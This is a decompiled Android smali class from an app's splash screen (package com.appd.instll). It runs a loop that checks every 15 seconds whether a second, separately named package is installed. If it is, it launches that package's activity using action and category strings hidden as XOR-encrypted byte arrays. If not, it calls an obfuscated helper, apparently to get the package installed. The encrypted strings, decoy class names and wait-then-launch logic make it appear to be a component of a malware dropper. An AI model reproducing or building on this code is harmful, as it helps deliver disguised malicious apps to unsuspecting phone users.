.class Lcom/appd/instll/splash$b;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/appd/instll/splash;->b()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/appd/instll/splash;


# direct methods
.method constructor <init>(Lcom/appd/instll/splash;)V
    .locals 0

    iput-object p1, p0, Lcom/appd/instll/splash$b;->a:Lcom/appd/instll/splash;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic a(Lcom/appd/instll/splash$b;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/appd/instll/splash$b;->c()V

    return-void
.end method

.method public static synthetic b(Lcom/appd/instll/splash$b;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/appd/instll/splash$b;->d()V

    return-void
.end method

.method private synthetic c()V
    .locals 12

    .line 1
    const/16 v0, 0x29

    const/16 v1, 0x1a

    const/high16 v2, 0x800000

    const/high16 v3, 0x10000000

    const/4 v4, 0x3

    const/16 v5, 0x8

    :try_start_0
    new-instance v6, Landroid/content/Intent;

    invoke-direct {v6}, Landroid/content/Intent;-><init>()V

    new-instance v7, Landroid/content/ComponentName;

    sget-object v8, Lcom/appd/instll/constants;->trid:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v10, Lcom/appd/instll/constants;->trid:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v10, v4, [B

    fill-array-data v10, :array_0

    new-array v11, v5, [B

    fill-array-data v11, :array_1

    invoke-static {v10, v11}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v7, v8, v9}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v6, v7}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    invoke-virtual {v6, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v6, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    new-array v7, v1, [B

    fill-array-data v7, :array_2

    new-array v8, v5, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    new-array v7, v0, [B

    fill-array-data v7, :array_4

    new-array v8, v5, [B

    fill-array-data v8, :array_5

    invoke-static {v7, v8}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    iget-object v7, p0, Lcom/appd/instll/splash$b;->a:Lcom/appd/instll/splash;

    invoke-virtual {v7, v6}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    new-instance v6, Landroid/content/Intent;

    invoke-direct {v6}, Landroid/content/Intent;-><init>()V

    new-instance v7, Landroid/content/ComponentName;

    sget-object v8, Lcom/appd/instll/constants;->trid:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v10, Lcom/appd/instll/constants;->trid:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v4, v4, [B

    fill-array-data v4, :array_6

    new-array v10, v5, [B

    fill-array-data v10, :array_7

    invoke-static {v4, v10}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v9, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v7, v8, v4}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v6, v7}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    invoke-virtual {v6, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v6, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    new-array v1, v1, [B

    fill-array-data v1, :array_8

    new-array v2, v5, [B

    fill-array-data v2, :array_9

    invoke-static {v1, v2}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v6, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v1, v5, [B

    fill-array-data v1, :array_b

    invoke-static {v0, v1}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    iget-object v0, p0, Lcom/appd/instll/splash$b;->a:Lcom/appd/instll/splash;

    invoke-virtual {v0, v6}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    iget-object v0, p0, Lcom/appd/instll/splash$b;->a:Lcom/appd/instll/splash;

    invoke-virtual {v0}, Lcom/appd/instll/splash;->finish()V

    return-void

    nop

    :array_0
    .array-data 1
        0x2bt
        0x7ft
        0x3et
    .end array-data

    :array_1
    .array-data 1
        0x5t
        0x3et
        0xft
        0x71t
        0x57t
        0x4bt
        -0x12t
        -0xct
    .end array-data

    :array_2
    .array-data 1
        0x37t
        0x3dt
        0x2ct
        0xat
        -0x1dt
        -0x6at
        -0x4ft
        0x16t
        0x3ft
        0x3dt
        0x3ct
        0x1dt
        -0x1et
        -0x75t
        -0x5t
        0x59t
        0x35t
        0x27t
        0x21t
        0x17t
        -0x1et
        -0x2ft
        -0x68t
        0x79t
        0x1ft
        0x1dt
    .end array-data

    nop

    :array_3
    .array-data 1
        0x56t
        0x53t
        0x48t
        0x78t
        -0x74t
        -0x1t
        -0x2bt
        0x38t
    .end array-data

    :array_4
    .array-data 1
        -0x72t
        0x1dt
        0x75t
        -0x5t
        -0x3bt
        0x75t
        0x76t
        0xet
        -0x7at
        0x1dt
        0x65t
        -0x14t
        -0x3ct
        0x68t
        0x3ct
        0x43t
        -0x72t
        0x7t
        0x74t
        -0x12t
        -0x3bt
        0x6et
        0x6bt
        0xet
        -0x5dt
        0x36t
        0x50t
        -0x39t
        -0x18t
        0x5dt
        0x51t
        0x6bt
        -0x50t
        0x3ft
        0x50t
        -0x24t
        -0x1ct
        0x5ft
        0x5at
        0x65t
        -0x43t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x11t
        0x73t
        0x11t
        -0x77t
        -0x56t
        0x1ct
        0x12t
        0x20t
    .end array-data

    :array_6
    .array-data 1
        -0x15t
        -0x5t
        0x55t
    .end array-data

    :array_7
    .array-data 1
        -0x3bt
        -0x46t
        0x67t
        0x9t
        0x11t
        0x2at
        0x4at
        -0x7ft
    .end array-data

    :array_8
    .array-data 1
        0x10t
        -0x39t
        0x77t
        -0x33t
        -0x36t
        -0x2bt
        -0x4t
        -0x32t
        0x18t
        -0x39t
        0x67t
        -0x26t
        -0x35t
        -0x38t
        -0x4at
        -0x7ft
        0x12t
        -0x23t
        0x7at
        -0x30t
        -0x35t
        -0x6et
        -0x2bt
        -0x5ft
        0x38t
        -0x19t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x71t
        -0x57t
        0x13t
        -0x41t
        -0x5bt
        -0x44t
        -0x68t
        -0x20t
    .end array-data

    :array_a
    .array-data 1
        0x23t
        0xct
        0x4ct
        0x68t
        0x10t
        -0x19t
        -0x71t
        -0x42t
        0x2bt
        0xct
        0x5ct
        0x7ft
        0x11t
        -0x6t
        -0x3bt
        -0xdt
        0x23t
        0x16t
        0x4dt
        0x7dt
        0x10t
        -0x4t
        -0x6et
        -0x42t
        0xet
        0x27t
        0x69t
        0x54t
        0x3dt
        -0x31t
        -0x58t
        -0x25t
        0x1dt
        0x2et
        0x69t
        0x4ft
        0x31t
        -0x33t
        -0x5dt
        -0x2bt
        0x10t
    .end array-data

    nop

    :array_b
    .array-data 1
        0x42t
        0x62t
        0x28t
        0x1at
        0x7ft
        -0x72t
        -0x15t
        -0x70t
    .end array-data
.end method

.method private synthetic d()V
    .locals 1

    .line 1
    iget-object v0, p0, Lcom/appd/instll/splash$b;->a:Lcom/appd/instll/splash;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lconfimanag/scanutil/alfagamma/transper/i5;->b(Landroid/content/Context;)V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    :goto_0
    const-wide/16 v0, 0x3a98

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    nop

    :goto_1
    iget-object v0, p0, Lcom/appd/instll/splash$b;->a:Lcom/appd/instll/splash;

    iget-object v0, v0, Lcom/appd/instll/splash;->b:Landroid/content/Context;

    sget-object v1, Lcom/appd/instll/constants;->trid:Ljava/lang/String;

    invoke-static {v0, v1}, Lconfimanag/scanutil/alfagamma/transper/k7;->c(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lcom/appd/instll/splash$b;->a:Lcom/appd/instll/splash;

    iget-object v1, v1, Lcom/appd/instll/splash;->b:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/appd/instll/a;

    invoke-direct {v1, p0}, Lcom/appd/instll/a;-><init>(Lcom/appd/instll/splash$b;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void

    :cond_0
    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lcom/appd/instll/splash$b;->a:Lcom/appd/instll/splash;

    iget-object v1, v1, Lcom/appd/instll/splash;->b:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/appd/instll/b;

    invoke-direct {v1, p0}, Lcom/appd/instll/b;-><init>(Lcom/appd/instll/splash$b;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_0
.end method
